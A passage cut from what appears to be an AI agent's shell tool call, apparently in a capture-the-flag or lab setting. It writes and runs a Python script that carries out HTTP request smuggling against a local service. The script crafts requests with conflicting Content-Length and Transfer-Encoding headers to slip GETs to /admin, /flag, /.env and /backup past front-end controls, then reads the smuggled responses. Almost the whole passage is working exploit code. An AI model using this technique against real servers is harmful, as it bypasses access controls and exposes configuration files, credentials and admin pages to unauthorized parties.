                             response.decode('utf-8',                           
                             errors='ignore')\n\n# The key insight:             
                             the smuggled request is queued, and                
                             the NEXT request gets the smuggled                 
                             response\n# Let's smuggle requests and             
                             then check follow-up                               
                             responses\n\nendpoints =                           
                             ['/dashboard', '/config', '/api',                  
                             '/status', '/system', '/debug',                    
                             '/console', '/profile', '/settings',               
                             '/users', '/admin', '/flag', '/.env',              
                             '/backup']\n\nfor endpoint in                      
                             endpoints:\n    # Smuggle a GET                    
                             request\n    smuggle = (\n                         
                             \"POST / HTTP/1.1\\r\\n\"\n                        
                             \"Host: 172.17.0.1:54223\\r\\n\"\n                 
                             \"Content-Length: 4\\r\\n\"\n                      
                             \"Transfer-Encoding: chunked\\r\\n\"\n             
                             \"\\r\\n\"\n        \"0\\r\\n\"\n                  
                             \"\\r\\n\"\n        f\"GET {endpoint}              
                             HTTP/1.1\\r\\n\"\n        \"Host:                  
                             172.17.0.1:54223\\r\\n\"\n        \"X:             
                             \"\n    )\n    \n    # Send the                    
                             smuggling request\n    sock =                      
                             socket.socket(socket.AF_INET,                      
                             socket.SOCK_STREAM)\n                              
                             sock.settimeout(3)\n                               
                             sock.connect((\"172.17.0.1\",                      
                             54223))\n                                          
                             sock.sendall(smuggle.encode())\n    \n             
                             # Read the first response (should be               
                             for POST /)\n    try:\n        resp1 =             
                             sock.recv(4096).decode('utf-8',                    
                             errors='ignore')\n    except:\n                    
                             resp1 = \"\"\n    \n    # Now send a               
                             follow-up request - this should get                
                             the smuggled response\n    followup =              
                             (\n        \"GET / HTTP/1.1\\r\\n\"\n              
                             \"Host: 172.17.0.1:54223\\r\\n\"\n                 
                             \"\\r\\n\"\n    )\n                                
                             sock.sendall(followup.encode())\n                  
                             \n    try:\n        resp2 =                        
                             sock.recv(4096).decode('utf-8',                    
                             errors='ignore')\n    except:\n                    
                             resp2 = \"\"\n    \n    sock.close()\n             
                             \n    # Check if the follow-up                     
                             response is interesting\n                          
                             status_line = resp2.split('\\r\\n')[0]             
                             if resp2 else \"No response\"\n    \n              
                             if '200' in status_line and 'Redirect'             
                             not in resp2:\n        print(f\"\\n===             
                             FOUND 200 for {endpoint} ===\")\n                  
                             print(f\"Status: {status_line}\")\n                
                             print(resp2[:500])\n    elif '403' in              
                             status_line:\n        print(f\"403 for             
                             {endpoint}\")\n    elif '404' in                   
                             status_line:\n        pass  # Skip                 
                             404s\n    elif '302' in status_line:\n             
                             pass  # Skip redirects\n    else:\n                
                             print(f\"\\n=== {endpoint}:                        
                             {status_line} ===\")\n        if                   
                             resp2:\n                                           
                             print(resp2[:300])\n\nprint(\"\\nDone!             
                             \")\n\nEOF\npython3                                
                             /tmp/test_hrs5.py", "timeout": 120}                
